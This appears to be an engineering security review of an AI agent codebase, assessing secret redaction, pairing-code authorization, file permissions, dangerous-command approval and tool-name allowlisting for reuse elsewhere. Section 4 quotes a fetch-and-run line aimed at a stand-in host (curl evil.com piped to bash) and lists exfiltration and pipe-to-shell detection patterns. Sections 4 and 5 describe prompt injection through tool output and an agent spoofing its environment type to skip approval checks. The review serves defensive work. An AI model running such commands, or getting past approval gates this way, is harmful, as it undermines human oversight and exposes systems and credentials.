# Security Patterns: Hermes Agent Analysis for Sylveste Adaptation

**Reviewer:** fd-security-patterns
**Source:** `research/hermes_agent/`
**Date:** 2026-03-02
**Decision lens:** Patterns that plug specific gaps not already covered by existing safety floors (lib-routing.sh) or interspect (hook_id allowlist, review_events schema).

---

## Executive Summary

Hermes Agent contains five security patterns that are directionally mature and partially adoptable for Sylveste. The strongest is `redact.py` — a layered regex redaction system with a `RedactingFormatter` that hooks into Python's logging infrastructure. The weakest is the `_secure_write()` pattern: correct in its target module (`pairing.py`) but inconsistently applied across the rest of the codebase. The most critical gap for Sylveste is the absence of runtime log redaction in Autarch (Go) and Intercom (Node/Rust). A Sylveste-specific redaction library would plug this immediately.

The NTM analysis (`fd-safety-observability-ntm.md`) already recommended a redaction engine at highest priority. Hermes Agent confirms that direction and provides a concrete, production-tested Python reference. The adaptation path for Sylveste is clear: port `redact.py` patterns to Go for Autarch and to TypeScript for Intercom's Node layer.

---

## 1. `redact.py` — Layered Regex Redaction

**Source:** `research/hermes_agent/agent/redact.py` (116 lines)
**Tests:** `research/hermes_agent/tests/agent/test_redact.py` (174 lines)

### What It Does

Five independent redaction layers applied sequentially to any string:

1. **Known-prefix patterns** (`_PREFIX_RE`): `sk-`, `ghp_`, `github_pat_`, `xox[baprs]-`, `AIza`, `pplx-`, `fal_`, `fc-`, `bb_live_`, `gAAAA`. Word-boundary anchored via negative lookahead/lookbehind `(?<![A-Za-z0-9_-])...(token)...(?![A-Za-z0-9_-])`. Combined into a single alternation regex for single-pass matching.

2. **ENV assignment patterns** (`_ENV_ASSIGN_RE`): Matches `KEY=value` where KEY contains `API_KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|AUTH`. Handles both bare and quoted values. Non-secret env vars (`HOME=`, `PATH=`) are unchanged by design.

3. **JSON field patterns** (`_JSON_FIELD_RE`): Matches `"apiKey"`, `"token"`, `"secret"`, `"password"`, `"access_token"`, `"refresh_token"`, `"auth_token"`, `"bearer"` in JSON objects. Case-insensitive.

4. **Authorization headers** (`_AUTH_HEADER_RE`): Matches `Authorization: Bearer <token>` case-insensitively.

5. **Telegram bot tokens** (`_TELEGRAM_RE`): Matches `bot<digits>:<alphanum_30+>` and bare `<digits>:<alphanum_30+>` format.

**Masking strategy:** Tokens under 18 chars → `***`. Tokens 18+ chars → `{token[:6]}...{token[-4:]}`. This preserves the prefix for debuggability (e.g., `sk-pro...j7k2`) without exposing the secret.

**`RedactingFormatter`:** Subclasses `logging.Formatter.format()` to run `redact_sensitive_text()` on every formatted log record. Plugs into the root logger handler so all libraries see redacted output.

**Integration in `run_agent.py`:** The `RedactingFormatter` is applied at agent init time (lines 258–281) to both the persistent error log (`~/.hermes/logs/errors.log`) and the verbose debug handler. This means all log output is redacted before it hits disk, regardless of which library emits it.

### Coverage Assessment

| Threat vector | Covered? | Notes |
|---|---|---|
| OpenAI/OpenRouter `sk-` keys in logs | Yes | `_PREFIX_RE` |
| GitHub PAT (classic) `ghp_` | Yes | `_PREFIX_RE` |
| GitHub PAT (fine-grained) `github_pat_` | Yes | `_PREFIX_RE` |
| Slack `xox*` tokens | Yes | `_PREFIX_RE` |
| Google API keys `AIza` | Yes | `_PREFIX_RE` |
| Perplexity, Fal.ai, Firecrawl | Yes | `_PREFIX_RE` |
| Telegram bot tokens | Yes | `_TELEGRAM_RE` |
| Bearer tokens in HTTP headers | Yes | `_AUTH_HEADER_RE` |
| Generic `KEY=value` env assignments | Yes | `_ENV_ASSIGN_RE` |
| JSON fields named `token`, `apiKey` etc. | Yes | `_JSON_FIELD_RE` |
| Anthropic `sk-ant-` keys | Partial | Falls under `sk-` prefix pattern but NOT specifically anchored for `sk-ant-` — a broad `sk-` match covers it |
| AWS access keys `AKIA...` | **No** | Not in `_PREFIX_PATTERNS`. AWS is present in NTM's engine but absent here. |
| JWT tokens `eyJ...` | **No** | Not covered. |
| Private keys `-----BEGIN...` | **No** | Not covered. |
| Database connection strings `postgres://user:pass@` | **No** | Not covered. |
| Hermes-specific `SUDO_PASSWORD` env var | Partial | Covered by `_ENV_ASSIGN_RE` if the text contains `SUDO_PASSWORD=<value>` but SUDO_PASSWORD is in the `_SECRET_ENV_NAMES` catch-all pattern via `SECRET` substring — verify |

**Gap:** The `_SECRET_ENV_NAMES` regex is `(?:API_?KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|AUTH)`. `SUDO_PASSWORD` matches `PASSWORD` — so it IS covered. However `SUDO` alone would not be caught if someone uses a custom name without these keywords.

**P0 gap:** AWS keys, JWTs, private keys, and database URLs are absent. These are all present in NTM's redaction engine (13 categories vs. Hermes's ~5 effective categories). For Sylveste's multi-cloud agents this is a concrete risk.

**Adoptability:** Very high. The five-layer architecture, word-boundary anchoring, and `RedactingFormatter` pattern are directly portable to Go (via a `slog.Handler` wrapper) and TypeScript (via a `winston` transport or `pino` redact plugin). The test suite covers all layers with `printenv`-simulation tests that verify real-world env-dump scenarios.

### Tag: P1

---

## 2. `PairingStore` Security — User Authorization Flow

**Source:** `research/hermes_agent/gateway/pairing.py` (283 lines)

### What It Does

Implements a cryptographic pairing code system for authorizing new users on messaging platforms (Telegram, Discord, Slack, WhatsApp). The design explicitly cites OWASP and NIST SP 800-63-4.

**Security properties:**

- **Cryptographic randomness:** `secrets.choice(ALPHABET)` for each of 8 characters. Uses Python's `secrets` module (CSPRNG), not `random`. This is the correct choice — `random` is not cryptographically secure.

- **Unambiguous alphabet:** `ABCDEFGHJKLMNPQRSTUVWXYZ23456789` (32 chars, no `0/O`, `1/I`). Reduces transcription errors over voice/screenshot. Entropy: log2(32^8) = 40 bits. Sufficient for a 1-hour OTP with rate limiting.

- **1-hour TTL:** `CODE_TTL_SECONDS = 3600`. Enforced by `_cleanup_expired()` called at the start of both `generate_code()` and `approve_code()`. Lazy cleanup (on access, not background timer) — this is fine for a low-volume pairing flow.

- **3 pending codes per platform cap:** `MAX_PENDING_PER_PLATFORM = 3`. Prevents trivial flooding of the pending queue.

- **Per-user rate limiting:** 10 minutes between code requests per `platform:user_id` key. Stored in `_rate_limits.json`.

- **Lockout after failed approvals:** 5 failed `approve_code()` attempts triggers a 1-hour platform lockout. Counter resets on lockout. Prevents brute-force against known code formats.

- **File permissions:** All data files written via `_secure_write()` which applies `chmod 0o600`. Codes stored in `{platform}-pending.json`, approved users in `{platform}-approved.json`, rate limit data in `_rate_limits.json`. All under `~/.hermes/pairing/`.

- **Codes never logged:** Docstring explicitly states "Codes are never logged to stdout." The `generate_code()` method returns the code as a return value — it is the caller's responsibility not to log it. There is no inline `logger.info()` call on the code variable.

### Completeness Assessment

**Strong:**
- The CSPRNG + unambiguous alphabet combination is correct.
- Rate limiting and lockout together provide layered brute-force protection.
- TTL + pending cap together prevent queue poisoning.
- `_secure_write()` consistently applied to all PairingStore data files.

**Weak or missing:**
- **No constant-time comparison for code approval** (line 178: `if code not in pending`). Dictionary `in` operator is O(1) average but not constant-time. For an 8-char code this is acceptable (timing side-channel requires microsecond-resolution measurements against a network endpoint), but purists would use `hmac.compare_digest()`.
- **No explicit directory chmod:** `PAIRING_DIR.mkdir(parents=True, exist_ok=True)` (line 66) creates the directory but does not set permissions on it. If the parent `~/.hermes/` is world-readable, `ls ~/.hermes/pairing/` leaks the platform names even if file contents are protected. Should apply `stat.S_IRWXU` to the directory itself.
- **No revocation notification:** `revoke()` removes the user from the approved list but does not invalidate any active sessions for that user. In a messaging context this means a revoked user may continue to receive responses until their session is expired by other means.
- **`_rate_limits.json` lacks its own TTL:** Failed attempts and rate limit timestamps accumulate indefinitely. A long-running deployment will grow this file without bound and could cause performance issues over years (minor, but worth noting).
- **`_record_failed_attempt()` prints to stdout** (line 254): `print(f"[pairing] Platform {platform} locked out...")`. This bypasses the `RedactingFormatter` and is not logged via the structured logger. Inconsistent with the "codes never logged" philosophy.

**Adoptability for Sylveste/Intercom:** High. Intercom currently uses a static `TELEGRAM_ALLOWED_USERS` env var for authorization. The PairingStore is a direct upgrade: it replaces a deploy-time configuration step with a runtime pairing flow that requires no server restart. The Intercom Rust daemon (`intercomd`) would need to implement equivalent logic — the patterns translate cleanly to Rust's `rand::rngs::OsRng` + `base32` or a custom unambiguous alphabet.

### Tag: P1

---

## 3. `_secure_write()` Pattern — Atomic Write + chmod 0o600

**Source:** `research/hermes_agent/gateway/pairing.py:45-52`

### What It Does

```python
def _secure_write(path: Path, data: str) -> None:
    """Write data to file with restrictive permissions (owner read/write only)."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(data, encoding="utf-8")
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass  # Windows doesn't support chmod the same way
```

**Used by:** Only `PairingStore._save_json()` in the entire codebase. All other state file writes use plain `open(..., 'w')` or `Path.write_text()` without permission restriction.

### Consistency Analysis — Files That Should Use `_secure_write()` But Don't

Surveying all file writes in `research/hermes_agent/`:

| File | Write call | Contains sensitive data? | Uses `_secure_write`? |
|---|---|---|---|
| `gateway/pairing.py:86` | `_secure_write()` | Yes — pairing codes, approved users, rate limits | **Yes** |
| `gateway/session.py:335` | `open(..., "w")` + `json.dump()` | Yes — full conversation history including credentials in tool outputs | **No** |
| `gateway/session.py:575,601` | `open(..., "a"/"w")` | Yes — JSONL transcripts | **No** |
| `gateway/config.py:402` | `open(..., "w")` + `json.dump()` | Yes — gateway config including bot tokens | **No** |
| `gateway/status.py:17` | `Path.write_text()` | Low — just PID | **No** |
| `gateway/sticker_cache.py:40` | `Path.write_text()` | Low — Telegram sticker IDs | **No** |
| `gateway/mirror.py:107` | `open(..., "a")` | Yes — mirrors conversation content | **No** |
| `run_agent.py:1161` | `open(..., "w")` + `json.dump()` | Yes — full session JSON with model config and all messages | **No** |
| `run_agent.py:1097` | `Path.write_text()` | Yes — API request dumps for debugging | **No** |
| `hermes_cli/config.py:612` | `open(..., "w")` + `yaml.dump()` | Low — config without secrets (secrets go to `.env`) | Low risk |
| `hermes_cli/config.py:657` | `open(..., "w")` | **Yes — `.env` file with API keys** | **No** |
| `gateway/channel_directory.py:55` | `open(..., "w")` + `json.dump()` | Low — channel metadata | **No** |

**Critical miss:** `hermes_cli/config.py`'s `save_env_value()` (line 631-657) writes the `.env` file containing `OPENROUTER_API_KEY`, `TELEGRAM_BOT_TOKEN`, `SUDO_PASSWORD`, and other credentials with no permission restriction. If the file is created by this function on a system with a permissive umask (e.g., `umask 022`), it will be world-readable at `0o644`.

**Second critical miss:** `gateway/config.py:402` writes `gateway.json` which contains bot token configuration, also without `chmod 0o600`.

**Note on atomicity:** `_secure_write()` itself is not atomic — it writes then chmods. Between the `write_text()` and `chmod()` calls, the file is briefly world-readable (if created new) under a permissive umask. True atomic secure write requires writing to a temp file, chmodding the temp file, then `os.rename()` to the target. Hermes does not implement this pattern.

**Adoptability for Sylveste:** The pattern is correct in intent but needs two fixes before adoption: (1) use `tempfile + os.rename()` for atomicity, (2) apply consistently to all state files containing secrets. In Autarch (Go), the equivalent is `os.WriteFile()` followed by `os.Chmod()`, or better: write to a temp file in the same directory, `os.Chmod(tmp, 0600)`, then `os.Rename(tmp, dst)`.

### Tag: P0 (for the `.env` write gap in Hermes); P2 (for the atomic write improvement)

---

## 4. Terminal Backend Isolation Hierarchy

**Source:** `research/hermes_agent/tools/terminal_tool.py`, `research/hermes_agent/tools/approval.py:248-249`

### What It Does

Five execution backends are supported, with different security guarantees:

| Backend | Isolation | Dangerous command check | Network access | Host filesystem |
|---|---|---|---|---|
| `local` | None — runs on host | Full pattern matching + approval prompt | Full | Full |
| `ssh` | Remote host only | Full pattern matching + approval prompt | Per SSH target | Per SSH target |
| `docker` | Container namespace | **Bypassed entirely** | Configurable | Mount-only |
| `singularity` | Container (HPC) | **Bypassed entirely** | Configurable | Bind mounts |
| `modal` | Cloud sandbox | **Bypassed entirely** | Full (cloud) | None |

**The key security decision** is at `approval.py:248-249`:

```python
if env_type in ("docker", "singularity", "modal"):
    return {"approved": True, "message": None}
```

All dangerous command pattern checking is bypassed for containerized environments. The rationale is that `rm -rf /` inside a Docker container does not harm the host. This is a defensible position for the patterns in `DANGEROUS_PATTERNS` (which are host-safety patterns), but it creates a different risk surface: an agent inside a container can still exfiltrate data, call out to external services, or exhaust compute/network resources without any human checkpoint.

**What `DANGEROUS_PATTERNS` covers and what it doesn't:**

The 26 patterns in `approval.py:23-48` are focused on **host integrity**: destructive filesystem ops, SQL mass-deletes, service disruption, fork bombs, pipe-to-shell, and shell injection via `-c` flags. This is a strong list for single-user local agent scenarios.

**Gaps in the pattern list:**
- No outbound data exfiltration detection (e.g., `curl ... | nc`, `scp`, `rsync` to unknown hosts)
- No process escape detection (container breakout patterns like `--privileged`, `--cap-add=SYS_ADMIN`)
- `bash -c` pattern (line 42) is in the list but is disabled for containerized envs — a `bash -c 'curl evil.com | bash'` inside Docker is unchecked
- `curl|wget pipe to shell` (line 44) is the single most important pattern for malware delivery, but it is also completely bypassed in containers

**The `env_type` trust boundary:** The `env_type` string is passed from `terminal_tool.py` to `check_dangerous_command()` based on an environment variable `TERMINAL_ENV`. If an adversarial agent could manipulate this variable (e.g., via a tool that sets environment variables), it could falsely claim to be running in "docker" mode and bypass all approval checks on a local host. This is not currently exploitable in Hermes's design (the variable is set at startup, not by tool call), but it is a pattern to be careful about when adapting.

**Autarch relevance:** Autarch (L3) orchestrates agents that may have terminal access. The three-tier decision (none / soft-block / hard-block) based on backend type is directly applicable to Autarch's agent sandbox configuration. The specific bypass for containerized envs is reasonable but should be documented as a deliberate trade-off, not an oversight.

### Tag: P1 (for the container bypass rationale); P2 (for exfiltration pattern gaps)

---

## 5. Tool Name Allowlist Enforcement

**Source:** `research/hermes_agent/run_agent.py:3491-3522`

### What It Does

At agent initialization, `self.valid_tool_names` is built from the tool definitions returned by `get_tool_definitions()`:

```python
self.valid_tool_names = {tool["function"]["name"] for tool in self.tools}
```

Before executing any tool call in the agent loop, every tool name is validated against this set:

```python
invalid_tool_calls = [
    tc.function.name for tc in assistant_message.tool_calls
    if tc.function.name not in self.valid_tool_names
]
```

**If the model generates an invalid tool name** (hallucination or prompt injection attempt), the agent:
1. Logs a warning with the invalid name (truncated to 80 chars)
2. Does NOT add the tool call to `messages` — the invalid call is not reflected back to the model
3. Retries the API call up to 3 times (`_invalid_tool_retries < 3`) without injecting any response
4. After 3 retries, returns a partial result with `"completed": False, "partial": True`

**Security property:** Unknown tool names are **rejected at the agent loop level** — they never reach `handle_function_call()` or the tool registry. The rejection is via retry-then-abort, not via injecting a "tool not found" error message. This is important: injecting an error message with the malicious tool name back to the model could leak the name back into the context, potentially aiding iterative prompt injection.

**What the pattern guards against:**
- Model hallucinations (non-existent tool names)
- Prompt injection attempts where adversarial content in tool output tries to invoke a privileged tool (e.g., injecting `{"tool_call": {"name": "execute_arbitrary_code", "args": "..."}}` into tool output that the model might echo)
- Jailbreaks that instruct the model to call a tool with a modified name to bypass per-tool safety checks

**Limitation — JSON injection through valid tools:** This pattern does NOT guard against prompt injection that uses valid tool names with adversarial arguments. For example, if a document being processed contains content that instructs the model to call `terminal` with a destructive command, this will pass the allowlist check and reach the `check_dangerous_command()` gate. The tool argument validation (lines 3528-3568) only checks JSON structural validity, not semantic content.

**Limitation — 3-retry before abort:** The retry behavior means the model sees the same prompt 3 times before the run is aborted. A sophisticated attacker could craft payloads that succeed on the third attempt (if the retry does not change the prompt). In practice, retrying the same API call with the same messages is unlikely to succeed because the model will likely make the same hallucination again.

**Model tool list printed to stdout:** Line 3504 prints `Valid tools: {sorted(self.valid_tool_names)}`. In verbose mode this reveals the full tool surface to anyone with console access. This is acceptable for a local agent but could be a policy issue in managed deployments.

**Adoptability for Autarch:** Direct adaptation. Autarch orchestrates agents via MCP tool calls. Maintaining a compile-time or config-time set of `valid_tool_names` and rejecting unknown names before routing is the correct pattern. The retry-then-abort behavior should be adopted as-is. The Autarch-specific consideration is that in a multi-agent setup, the `valid_tool_names` set may differ per agent context — this needs to be session-scoped, not global.

### Tag: P1

---

## 6. `.env` Loading Priority Chain

**Source:** `research/hermes_agent/run_agent.py:42-65`, `research/hermes_agent/hermes_cli/config.py:660-668`

### What It Does

**Load priority at agent startup** (`run_agent.py:42-65`):

1. `~/.hermes/.env` — user-scoped secrets home (primary)
2. `{project_root}/.env` — project-local dev fallback (only if `~/.hermes/.env` does not exist)
3. System environment variables — implicitly available if neither file exists

This is a two-file priority chain with an implicit third level. The `dotenv` library's `load_dotenv()` is used with explicit `dotenv_path=` argument, which means it does NOT search up the directory tree automatically. A `.env` in any parent directory or working directory will NOT be loaded unless it happens to be one of these two paths.

**Isolation guarantee:** User secrets (`~/.hermes/.env`) are never overridable by a project-local `.env` — the project `.env` only activates when the user `.env` is absent. This prevents a compromised project repository from injecting its own API keys over the user's keys by placing a `.env` in the project directory.

**`get_env_value()` lookup order** (`config.py:660-668`):

```python
def get_env_value(key: str) -> Optional[str]:
    if key in os.environ:
        return os.environ[key]    # 1. Already-loaded env vars (from dotenv)
    env_vars = load_env()
    return env_vars.get(key)      # 2. Direct file read of ~/.hermes/.env
```

The `load_env()` call on fallback is a direct file read (not `os.getenv`), meaning it picks up changes to the `.env` file without process restart. This is convenient but means an attacker who can write to `~/.hermes/.env` can inject credentials that take effect on the next `get_env_value()` call.

**Multi-tenant gap:** There is no namespace isolation between multiple users or agent instances on the same machine. `~/.hermes/.env` is a single file for all agents running under the same Unix user. In Sylveste's multi-agent deployments where multiple Autarch agents run concurrently under the same service account, this creates credential sharing — all agents see the same API keys. This is likely acceptable for Hermes's single-user design but would be a regression for Sylveste's multi-tenant model.

**Missing: `.env` file permission check at startup.** The loader does not verify `os.stat(~/.hermes/.env).st_mode` before loading. If the file has been world-readable due to a missed `chmod` (see Section 3), the agent loads it anyway without warning. A startup check that warns when the file mode is looser than `0o600` would be valuable.

**Adoptability for Autarch/Intercom:** The two-tier priority (user home → project fallback) is directly applicable to Autarch. Intercom already achieves isolation differently (group-level per-container sandboxing with environment injection at container spawn time) — the Hermes `.env` chain is less relevant there. The startup mode check is independently valuable for any component that loads secrets from disk.

### Tag: P2

---

## Cross-Cutting Gaps Observed

### Not Covered by Any Pattern in Hermes

These gaps exist across the Hermes codebase and would also need to be addressed in any Sylveste adaptation:

**G1. No secrets in trajectories/sessions check.** `run_agent.py`'s `_save_session_log()` writes full message history to `~/.hermes/sessions/session_*.json` without running `redact_sensitive_text()` first. The `RedactingFormatter` only covers the Python logging framework; it does NOT cover data written to disk via direct file I/O. The same issue applies to `gateway/session.py` transcript writes and `gateway/mirror.py` JSONL writes. A tool that returns an API key in its output will persist that key to disk in the session log. `agent/trajectory.py` similarly writes trajectories without redaction. This is a **P0 gap in Hermes** and would be a P0 gap in any Sylveste adoption that includes session persistence.

**G2. `save_config()` and `save_env_value()` use default umask permissions.** Analyzed in Section 3. The `.env` file at `~/.hermes/.env` is written without explicit `chmod 0o600`. On a typical Linux system with `umask 022`, newly created files are `0o644` (world-readable). This is the most concrete credential exposure risk in the Hermes codebase.

**G3. No redaction in `hermes_cli/status.py`.** The `status.py` module writes a PID file (low risk) but the CLI's `show_config()` function in `config.py:684` reads and displays credentials using its own local `redact_key()` function (line 675-681) rather than `redact_sensitive_text()`. The local function only truncates long keys (`key[:4]...key[-4:]`) — it does not cover JSON, ENV assignment, or Bearer header formats. This is a lesser inconsistency but worth noting.

**G4. `DANGEROUS_PATTERNS` regex uses `command_lower` for matching.** `approval.py:61`: `command_lower = command.lower()`. Then the regex patterns themselves include `re.IGNORECASE` flag (line 63). This double-lowercasing is harmless but suggests the IGNORECASE flag on the patterns is redundant. More importantly, the lowercasing means a shell command obfuscated with mixed-case (`RmDir -R /`) would still be caught — which is correct.

**G5. Tool argument redaction gap.** `run_agent.py:1488` (verbose logging path) logs `tc.function.arguments[:200]...` — the first 200 chars of every tool call argument. If a tool is called with an argument containing a credential (e.g., `set_api_key(key="sk-proj-abc123...")`) the key would appear in the verbose log. The `RedactingFormatter` would catch this only if the log handler uses it — which it does in verbose mode (lines 277-281). But in non-verbose (INFO) mode, the argument is not logged at all. This is acceptable coverage but should be verified when adapting.

---

## Comparison to Existing Sylveste Safety Floors

Based on `fd-safety-observability-ntm.md` and the NTM analysis:

| Pattern | Hermes | NTM (already reviewed) | Sylveste current state | Delta |
|---|---|---|---|---|
| Runtime log redaction | Yes (`RedactingFormatter`) | Yes (13 categories, priority-ordered, deterministic placeholders) | **None** | Both sources recommend; adopt NTM's richer Go engine, use Hermes as reference for the Python/logging.Formatter pattern |
| Pairing/user authorization | Yes (PairingStore) | Not in NTM | Intercom uses static `TELEGRAM_ALLOWED_USERS` | Gap: Hermes's PairingStore is a production-ready upgrade for Intercom |
| Secure file writes | Partial (only pairing.py) | Not in NTM | **None** | Gap: Go `os.WriteFile` + `os.Chmod` pattern needed in Autarch for any state files containing secrets |
| Dangerous command blocking | Yes (DANGEROUS_PATTERNS, 26 patterns) | Yes (NTM blocks commands via approval engine) | Intercom containers provide isolation by default | Hermes's patterns useful for Autarch local-exec; NTM's approval engine for managed deployments |
| Tool allowlist enforcement | Yes (valid_tool_names set) | Not in NTM | **None** | Gap: Autarch MCP routing should validate tool names before dispatch |
| Credential isolation (.env priority) | Yes (home > project) | Not applicable (Go, no .env) | Intercom uses Docker env injection | Hermes pattern useful for Autarch local dev; Intercom already has stronger isolation |

Interspect (hook_id allowlist, review_events schema) provides event-level filtering for the plugin system. It does not provide credential redaction or tool name validation for the agent execution layer. These are distinct and non-overlapping concerns.

---

## Adaptation Opportunities — Beads to Create

The following are concrete items Sylveste should track. Listed in descending priority.

### P0 Items

**AO-1: Go redaction library for Autarch**
Port Hermes's five-layer redaction approach to Go as a shared package at `core/redact/`. Add the AWS key, JWT, and private key patterns from NTM's 13-category engine. Expose as both a `slog.Handler` wrapper (for structured logging) and a `Redact(string) string` function (for explicit redaction of values before storage). Apply to: Autarch session persistence, Autarch MCP call logging, Intercore orchestration logs.
_Reference: `research/hermes_agent/agent/redact.py:1-116`, `research/hermes_agent/tests/agent/test_redact.py:1-174`_

**AO-2: Session/transcript redaction before disk writes in Hermes-derived components**
When adapting any Hermes session persistence pattern (gateway transcripts, session JSON logs), run `redact_sensitive_text()` on content before writing to disk. This is a gap in Hermes itself that must not be carried forward.
_Reference: `research/hermes_agent/run_agent.py:1161`, `research/hermes_agent/gateway/session.py:335,575,601`_

### P1 Items

**AO-3: PairingStore port for Intercom**
Replace `TELEGRAM_ALLOWED_USERS` static env var with a runtime pairing flow using `OsRng`-based codes, 1-hour TTL, rate limiting, and lockout. Implement in the Intercom Rust daemon (`intercomd`). Store data under `~/.intercom/pairing/` with `0o600` permissions.
_Reference: `research/hermes_agent/gateway/pairing.py:1-283`_

**AO-4: Secure state file writes in Autarch**
Audit all `os.WriteFile()` calls in `apps/autarch/internal/` that write to files containing API keys, tokens, session data, or user credentials. Apply a `SecureWriteFile(path, data, perm)` wrapper that writes to a temp file, chmods it, then renames. The 20 files identified in the write-call audit should be triaged.
_Reference: `research/hermes_agent/gateway/pairing.py:45-52` (pattern to improve); Section 3 consistency analysis_

**AO-5: Tool name allowlist enforcement in Autarch MCP router**
In Autarch's MCP client routing layer, build a `valid_tool_names` set from the registered tool schemas at startup. Reject (with retry, then abort) any tool calls not in the set before dispatching to handlers. Log the invalid name at WARN level using a redacting logger to prevent the name from appearing in plain logs.
_Reference: `research/hermes_agent/run_agent.py:3491-3522`_

**AO-6: Startup `.env` permission check**
In any Sylveste component that loads secrets from a file (Autarch CLI, Intercom Node host), check the file mode at startup and emit a WARN if the file is readable by group or world. Example: `if (stat.Mode() & 0o077) != 0 { warn("credentials file is group/world readable: %s", path) }`.
_Reference: `research/hermes_agent/hermes_cli/config.py:631-657` (gap identified)_

### P2 Items

**AO-7: Extend Hermes-derived redaction with AWS + JWT patterns**
When adapting `redact.py` for any Python components (e.g., interverse plugins written in Python), extend `_PREFIX_PATTERNS` with: AWS access key (`AKIA[0-9A-Z]{16}`), JWT (`eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`), and database URL (`(postgres|mysql|mongodb)://[^@]+:[^@]+@`).
_Reference: `research/hermes_agent/agent/redact.py:17-28`; NTM `internal/redaction/` for pattern reference_

**AO-8: Container bypass for dangerous commands — document as explicit policy**
When adapting Hermes's `check_dangerous_command()` for Autarch's local exec path, explicitly document the container bypass decision (docker/singularity/modal skip all DANGEROUS_PATTERNS checks). Add a comment noting that this bypasses exfiltration patterns (curl|pipe-to-shell) as well as integrity patterns — and that this is acceptable because containers are already ephemeral. Add at minimum a log at INFO level when a dangerous-pattern command executes in a container context, for audit purposes.
_Reference: `research/hermes_agent/tools/approval.py:248-249`_

**AO-9: Atomic secure write helper**
Implement `atomic_secure_write(path, data)` that writes to `{path}.tmp`, chmods to `0o600`, then `os.rename()` to `path`. This closes the TOCTOU window in Hermes's `_secure_write()`. Add to both the Go `core/redact/` package (as `SecureWriteFile`) and any Python interverse plugin that writes secrets to disk.
_Reference: `research/hermes_agent/gateway/pairing.py:45-52`_

### P3 Items

**AO-10: TypeScript redaction transport for Intercom Node host**
The Intercom Node host (`apps/intercom/src/index.ts`) handles messaging channel traffic. A `pino-redact` configuration or custom `winston` transport using patterns equivalent to Hermes's `redact_sensitive_text()` would prevent Telegram/Discord tokens or user-provided credentials from appearing in the Node process logs.
_Reference: `research/hermes_agent/agent/redact.py:107-115` (RedactingFormatter pattern)_

**AO-11: `_record_failed_attempt()` stdout print — replace with structured logger**
In the Hermes pairing module, `_record_failed_attempt()` prints lockout events directly to stdout (line 254). In any Sylveste adaptation, replace this with a structured log call that goes through the redacting formatter. This is a minor consistency fix but reinforces the principle that all output paths are covered.
_Reference: `research/hermes_agent/gateway/pairing.py:254`_

---

## Summary Table

| Finding | File:Lines | Tag | Adoptable? |
|---|---|---|---|
| `redact.py` five-layer architecture | `agent/redact.py:1-116` | P1 | Yes — port to Go + TypeScript; extend with AWS/JWT |
| `RedactingFormatter` on all log handlers | `run_agent.py:257-281` | P1 | Yes — `slog.Handler` wrapper in Go |
| Session JSON written without redaction | `run_agent.py:1161` | P0 | Gap to avoid in adaptation |
| `.env` write without `chmod 0o600` | `hermes_cli/config.py:657` | P0 | Gap to avoid; add `SecureWriteFile` |
| `PairingStore` CSPRNG + unambiguous alphabet | `gateway/pairing.py:152-153` | P1 | Yes — port to Rust for Intercom |
| PairingStore TTL + rate limit + lockout | `gateway/pairing.py:126-256` | P1 | Yes — complete package |
| `_secure_write()` only in pairing.py | `gateway/pairing.py:45-52` | P0 | Pattern is correct; coverage is not |
| No directory chmod on `PAIRING_DIR` | `gateway/pairing.py:66` | P2 | Fix before adapting |
| Container env bypasses all dangerous command checks | `tools/approval.py:248-249` | P1 | Adopt as explicit policy with logging |
| `DANGEROUS_PATTERNS` — missing exfiltration patterns | `tools/approval.py:23-48` | P2 | Extend with curl/scp exfiltration patterns |
| `valid_tool_names` allowlist before dispatch | `run_agent.py:3491-3522` | P1 | Yes — directly applicable to Autarch MCP router |
| Retry-then-abort for invalid tool calls | `run_agent.py:3506-3521` | P1 | Yes — adopt the 3-retry pattern |
| `.env` priority chain (home > project) | `run_agent.py:42-65` | P2 | Yes — applicable to Autarch local dev |
| No startup permission check on `.env` file | `hermes_cli/config.py:587-602` | P2 | Add to any secrets-loading component |
